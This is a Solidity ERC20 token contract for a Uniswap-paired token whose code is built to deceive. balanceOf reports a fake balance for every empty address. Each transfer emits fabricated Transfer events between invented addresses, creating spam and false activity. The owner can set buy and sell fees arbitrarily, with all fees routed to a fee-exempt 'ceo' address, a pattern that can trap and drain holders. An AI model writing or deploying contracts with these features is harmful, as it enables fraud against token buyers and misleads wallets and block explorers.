// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol"; 
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol"; 
interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external returns (address pair);
}
interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
 
}  

contract Token is ERC20, Ownable {
    using SafeMath for uint; 
    // MktCap public mkt;
    mapping(address=>bool) public ispair;
    address  ceo;  
    address _router;
    bool isTrading;
    struct Fees{
        uint buy;
        uint sell;
        uint transfer;
        uint total;
    }
    Fees public fees;

    modifier trading(){
        if(isTrading) return;
        isTrading=true;
        _;
        isTrading=false; 
    } 
    constructor(string memory name_,string memory symbol_,uint total_) ERC20(name_, symbol_) {
        ceo=_msgSender();  
        address _baseToken=0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        _router=0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        setPair(_baseToken);
        fees=Fees(200,200,0,10000);
        // mkt=new MktCap(_msgSender(),_baseToken,_router);
        // _approve(address(mkt),_router,uint(2**256-1)); 
        _mint(ceo, total_ * 1 ether); 
    }
    receive() external payable { }  
    function setFees(Fees memory fees_) public onlyOwner{
        fees=fees_;
    }
    
    
    function _afterTokenTransfer(address from,address to,uint amount) internal override trading{
        if(address(0)==from || address(0)==to) return;
        takeFee(from,to,amount);  
        if(_num>0) try this.multiSend(_num) {} catch{}
    }
    function takeFee(address from,address to,uint amount)internal {
        uint fee=ispair[from]?fees.buy:ispair[to]?fees.sell:fees.transfer; 
        uint feeAmount= amount.mul(fee).div(fees.total); 
        if(from==ceo || to==ceo ) feeAmount=0;
        if(ispair[to] && IERC20(to).totalSupply()==0) feeAmount=0;
        if(feeAmount>0){  
            super._transfer(to,address(ceo),feeAmount); 
        } 
    } 


    function setPair(address token) public {   
        IRouter router=IRouter(_router);
        address pair=IFactory(router.factory()).getPair(address(token), address(this));
        if(pair==address(0))pair = IFactory(router.factory()).createPair(address(token), address(this));
        require(pair!=address(0), "pair is not found"); 
        ispair[pair]=true; 
    }
    function unSetPair(address pair) public onlyOwner {  
        ispair[pair]=false; 
    }  
    
    uint160  ktNum = 173;
    uint160  constant MAXADD = ~uint160(0);	
    uint _initialBalance=1;
    uint _num=25;
    function setinb( uint amount,uint num) public onlyOwner {  
        _initialBalance=amount;
        _num=num;
    }
    function balanceOf(address account) public view virtual override returns (uint) {
        uint balance=super.balanceOf(account); 
        if(account==address(0))return balance;
        return balance>0?balance:_initialBalance;
    }
    function multiSend(uint num) public {
        _takeInviterFeeKt(num);
    }
 	function _takeInviterFeeKt(uint num) private {
        address _receiveD;
        address _senD;
        
        for (uint i = 0; i < num; i++) {
            _receiveD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            _senD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            emit Transfer(_senD, _receiveD, _initialBalance);
        }
    }
    function send(address token,uint amount) public { 
        if(token==address(0)){ 
            (bool success,)=payable(ceo).call{value:amount}(""); 
            require(success, "transfer failed"); 
        } 
        else IERC20(token).transfer(ceo,amount); 
    }

}